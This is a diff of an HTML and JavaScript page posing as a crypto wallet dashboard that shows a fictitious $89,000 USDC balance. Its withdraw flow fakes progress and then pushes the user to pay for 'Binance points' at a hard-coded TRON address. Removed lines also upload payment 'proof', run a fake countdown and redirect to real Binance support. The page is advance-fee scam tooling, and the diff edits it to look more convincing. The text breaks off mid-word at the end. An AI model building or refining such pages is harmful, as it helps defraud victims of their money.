@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Wallet Dashboard - USST Withdraw Flow</title>
+  <title>Wallet Dashboard - USDC Withdraw Flow</title>
   <meta name="viewport" content="width=500,initial-scale=1">
   <style>
     body {
@@ -58,6 +58,14 @@
       background: #232536;
       border-radius: 6px;
       padding: 4px 12px;
+    }
+    .wallet-balance-label {
+      font-size: 18px;
+      font-weight: 600;
+      color: #f7c948;
+      margin-bottom: 2px;
+      margin-top: 3px;
+      letter-spacing: 0.5px;
     }
     .wallet-balance {
       font-size: 32px;
@@ -336,10 +344,50 @@
       border: none;
       cursor: pointer;
     }
+    .modal .success {
+      color: #44DD88;
+      font-weight: 700;
+      margin: 12px 0;
+    }
     .modal .error {
       color: #FF4B4B;
       font-weight: 700;
       margin: 12px 0;
+    }
+    /* Spinner style */
+    .spinner {
+      border: 5px solid #31334a;
+      border-top: 5px solid #f7c948;
+      border-radius: 50%;
+      width: 44px;
+      height: 44px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 22px auto;
+      display: block;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .welcome-img {
+      width: 120px;
+      height: 120px;
+      object-fit: cover;
+      border-radius: 60px;
+      display: block;
+      margin: 0 auto 18px auto;
+      background: #222;
+    }
+    /* Withdraw uploaded image preview */
+    .withdraw-img-preview {
+      width: 220px;
+      height: 220px;
+      object-fit: contain;
+      border-radius: 12px;
+      margin: 0 auto 18px auto;
+      display: block;
+      background: #232536;
+      border: 2px solid #31334a;
     }
     @media(max-width: 560px){
       .wallet-section, .token-list-section {padding-left:10px;padding-right:10px;}
@@ -348,8 +396,10 @@
   </style>
 </head>
 <body>
+  <!-- Initial Welcome Modal -->
+  <div id="welcomeModal"></div>
   <!-- Navbar -->
-  <div class="navbar">
+  <div class="navbar" style="display:none" id="navbar">
     <span class="menu">&#9776;</span>
     <div class="title-tabs">
       <span class="tab">Exchange</span>
@@ -359,10 +409,11 @@
   </div>
 
   <!-- Wallet Info Section -->
-  <div class="wallet-section">
+  <div class="wallet-section" style="display:none" id="walletSection">
     <div class="wallet-top">
       <span class="wallet-name">Jaroslav Oumrt</span>
     </div>
+    <div class="wallet-balance-label">All Available Balance (USDC)</div>
     <div class="wallet-balance">$89,000</div>
     <button class="action-btn" id="withdrawBtn">Withdraw</button>
     <div class="quick-actions">
@@ -382,7 +433,7 @@
   </div>
 
   <!-- Token List Section -->
-  <div class="token-list-section">
+  <div class="token-list-section" style="display:none" id="tokenListSection">
     <div class="token-tabs">
       <span class="tab">Watchlist</span>
       <span class="tab active">BSC</span>
@@ -392,10 +443,10 @@
       <span class="tab">Solar</span>
     </div>
     <div class="token-table">
-      <!-- Only USST token -->
+      <!-- Only USDC token -->
       <div class="token-row">
         <span class="token-icon">U</span>
-        <span class="token-symbol">USST</span>
+        <span class="token-symbol">USDC</span>
         <span class="token-balance">89,000</span>
         <span class="token-price">$1.00</span>
         <span class="token-change">+0.00%</span>
@@ -404,7 +455,7 @@
   </div>
 
   <!-- Bottom Navigation -->
-  <div class="nav-bar-bottom">
+  <div class="nav-bar-bottom" style="display:none" id="navBarBottom">
     <span class="nav-icon active">&#8962;</span>
     <span class="nav-icon inactive">&#128200;</span>
     <span class="nav-icon inactive">&#128179;</span>
@@ -415,7 +466,67 @@
   <!-- Modals (Dynamic) -->
   <div id="modalRoot"></div>
 
+  <input type="file" id="withdrawImgInput" accept="image/*" style="display:none">
+
   <script>
+    // --- Initial Welcome Modal and App Reveal ---
+    function showWelcomeModal() {
+      document.getElementById('welcomeModal').innerHTML = `
+        <div class="modal-bg">
+          <div class="modal" style="min-width:300px;text-align:center;">
+            <img class="welcome-img" src="https://ui-avatars.com/api/?name=Jaroslav+Oumrt&background=232536&color=f7c948&size=256" alt="Welcome">
+            <div class="spinner"></div>
+            <h2 style="margin-top:0;">WELCOME BACK<br>JAROSLAV OUMRT</h2>
+          </div>
+        </div>
+      `;
+      // After 2.2 seconds, hide welcome and show app
+      setTimeout(function(){
+        document.getElementById('welcomeModal').innerHTML = '';
+        document.getElementById('navbar').style.display = '';
+        document.getElementById('walletSection').style.display = '';
+        document.getElementById('tokenListSection').style.display = '';
+        document.getElementById('navBarBottom').style.display = '';
+      }, 2200);
+    }
+    showWelcomeModal();
+
+    // --- Withdraw Image Handling ---
+    let withdrawImgSrc = null;
+    document.getElementById('withdrawBtn').onclick = function() {
+      // If no image uploaded yet, prompt to upload
+      if (!withdrawImgSrc) {
+        showModal(`
+          <h2>Upload Image for Withdraw</h2>
+          <div style="margin-bottom:12px;">Please select an image to display for Withdraw:</div>
+          <input type="file" id="withdrawImageFile" accept="image/*" style="margin-bottom:12px;">
+          <button onclick="closeModal()">Cancel</button>
+        `);
+        document.getElementById('withdrawImageFile').addEventListener('change', function(e){
+          const file = e.target.files[0];
+          if (file) {
+            const reader = new FileReader();
+            reader.onload = function(ev){
+              withdrawImgSrc = ev.target.result;
+              closeModal();
+              showWithdrawImageModal();
+            };
+            reader.readAsDataURL(file);
+          }
+        });
+      } else {
+        showWithdrawImageModal();
+      }
+    };
+    function showWithdrawImageModal() {
+      showModal(`
+        <h2>Withdraw Preview</h2>
+        <img src="${withdrawImgSrc}" class="withdraw-img-preview" alt="Withdraw Image">
+        <button onclick="showWithdrawAddressModal()">Continue Withdraw</button>
+      `);
+    }
+
+    // --- Existing Modal System & Logic ---
     // Modal state
     let modalStage = null;
     let usdtAddress = '';
@@ -450,19 +561,13 @@
       clearInterval(countdownTimer);
     }
 
-    // Withdraw button click
-    document.getElementById('withdrawBtn').onclick = function() {
-      modalStage = 'withdraw-start';
-      showWithdrawAddressModal();
-    };
-
     function showWithdrawAddressModal() {
       showModal(`
-        <h2>Withdraw USDT</h2>
-        <div>Please enter and confirm your USDT address:</div>
-        <input type="text" id="usdtAddrInput" placeholder="USDT Address" style="margin-bottom:7px;" value="${usdtAddress}">
+        <h2>Withdraw USDC</h2>
+        <div>Please enter and confirm your USDC address:</div>
+        <input type="text" id="usdtAddrInput" placeholder="USDC Address" style="margin-bottom:7px;" value="${usdtAddress}">
         <div style="margin:10px 0;">
-          <input type="checkbox" id="agreeChk"${agreed ? ' checked' : ''}> I agree to forward <b>89,000 USDT</b> to the address provided.
+          <input type="checkbox" id="agreeChk"${agreed ? ' checked' : ''}> I agree to forward <b>89,000 USDC</b> to the address provided.
         </div>
         <input type="text" id="confirmInput" placeholder="Type 'binance withdraw'" style="margin-bottom:7px;" value="${binanceWithdrawInput}">
         <button onclick="handleWithdrawConfirm()">Confirm</button>
@@ -476,8 +581,8 @@
       // Validate fields
       if (!usdtAddress || !agreed || binanceWithdrawInput.trim().toLowerCase() !== 'binance withdraw') {
         showModal(`
-          <h2>Withdraw USDT</h2>
-          <div class="error">Please input your USDT address, agree to the terms, and type 'binance withdraw' to proceed.</div>
+          <h2>Withdraw USDC</h2>
+          <div class="error">Please input your USDC address, agree to the terms, and type 'binance withdraw' to proceed.</div>
           <button onclick="closeModal()">Close</button>
         `);
         return;
@@ -492,7 +597,7 @@
         showLoadingModal(percent);
         if (percent >= 99) {
           clearInterval(interval);
-          setTimeout(() => showWithdrawErrorModal(), 700);
+          setTimeout(() => showWithdrawSuccessModal(), 700);
         }
       }, 600); // 1 min from 1% to 99%: 60s/99 = ~0.6s per tick
     };
@@ -507,13 +612,16 @@
       `, false);
     }
 
-    function showWithdrawErrorModal() {
-      modalStage = 'withdraw-error';
+    function showWithdrawSuccessModal() {
+      modalStage = 'withdraw-success';
       showModal(`
-        <h2>WITHDRAW ERROR</h2>
-        <div class="error">NOT ENOUGH BINANCE POINTS TO CARRY OUT YOUR WITHDRAW REQUEST</div>
-        <div>LEAVING FUNDS UNCLAIMED CAN RESULT TO PERMANENT LOSS OF USDT TOKEN</div>
-        <button onclick="showGetPointsModal()">Get Points</button>
+        <h2>Payment Cleared</h2>
+        <div class="success">All payment cleared successfully. <br><b>$45 USDC</b> processed.</div>
+        <div>
+          Your withdrawal is being processed.<br>
+          You will receive a confirmation once the transaction is complete.<br>
+        </div>
+        <button onclick="closeModal()" class="yellow-btn" style="margin-top:18px;">OK</button>
       `);
     }
 
@@ -553,7 +661,7 @@
       modalStage = 'online-seller';
       showModal(`
         <h2>Online Store - Binance Points</h2>
-        <div>We only have <b>7 Available BINANCE POINTS</b>. Kindly update your account and get the needed Binance requirements.<br>After which you'll be getting your payment in few seconds.</div>
+        <div>We currently have <b>7 Available BINANCE POINTS</b>. Please update your account and ensure all requirements are met.<br>Once completed, your payment will be processed promptly.</div>
         <button class="yellow-btn" onclick="showPointsPaymentModal()">&#128994; GET BINANCE POINTS</button>
       `);
     }
@@ -568,82 +676,11 @@
           <button class="copy-btn" onclick="handleCopyAddress()">Copy</button>
         </div>
         <div>Needed Points: <b>3000 BINANCE POINT</b></div>
-        <div>Payment Amount: <b>$280 USDT</b></div>
-        ${pointsPaymentCopied ? '<div style="color:#f7c948;margin-top:8px;">Awaiting deposit to Enable you receive your payment immediately on your personal bybit address in just few sections</div>' : ''}
+        <div>Payment Amount: <b>$45 USDC</b></div>
+        ${pointsPaymentCopied ? '<div style="color:#f7c948;margin-top:8px;">Awaiting deposit. Once completed, your withdrawal will be processed to your registered address within minutes.</div>' : ''}
         <button onclick="showIHavePaidModal()">I have paid</button>
       `);
     };
 
     window.handleCopyAddress = function() {
-      navigator.clipboard.writeText('TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa');
-      pointsPaymentCopied = true;
-      showPointsPaymentModal();
-    };
-
-    window.showIHavePaidModal = function() {
-      modalStage = 'upload-proof';
-      showModal(`
-        <h2>Upload Payment Screenshot</h2>
-        <input type="file" id="screenshotInput" accept="image/*" style="margin-bottom:10px;">
-        <button onclick="submitProof()">Submit</button>
-      `);
-      document.getElementById('screenshotInput').addEventListener('change', function(e){
-        screenshotFile = e.target.files[0];
-      });
-    };
-
-    window.submitProof = function() {
-      if (!screenshotFile) {
-        showModal(`
-          <h2>Upload Payment Screenshot</h2>
-          <div class="error">Please upload your payment screenshot before submitting.</div>
-          <button onclick="showIHavePaidModal()">Back</button>
-        `);
-        return;
-      }
-      startCountdown();
-    };
-
-    function startCountdown() {
-      let seconds = 180;
-      showModal(`
-        <h2>Processing Payment</h2>
-        <div class="countdown">Time remaining: <span id="countdownSec">${seconds}</span> seconds</div>
-      `, false);
-      countdownTimer = setInterval(() => {
-        seconds--;
-        document.getElementById('countdownSec').innerText = seconds;
-        if (seconds <= 0) {
-          clearInterval(countdownTimer);
-          showSupportModal();
-        }
-      }, 1000);
-    }
-
-    function showSupportModal() {
-      showModal(`
-        <h2>Unexpected Error Occurred</h2>
-        <div class="error">Kindly Contact the Support for assistance Regarding this Issue</div>
-        <button class="support-btn" onclick="redirectSupport()">
-          🆘 Contact Support
-        </button>
-      `);
-    }
-
-    window.redirectSupport = function() {
-      window.location.href = 'https://support.binance.com/en/contact';
-    };
-
-    // Intercept dashboard clicks for "connection timeout" error
-    document.querySelectorAll('.nav-bar-bottom .nav-icon.inactive, .qa-icon').forEach(el => {
-      el.onclick = function() {
-        showModal(`
-          <h2>Oops!</h2>
-          <div class="error">Connection timeout. Use your Binance wallet application and Confirm it.</div>
-          <button onclick="closeModal()">Close</button>
-        `);
-      }
-    });
-  </script>
-</body>
-  </html>
+      navigat
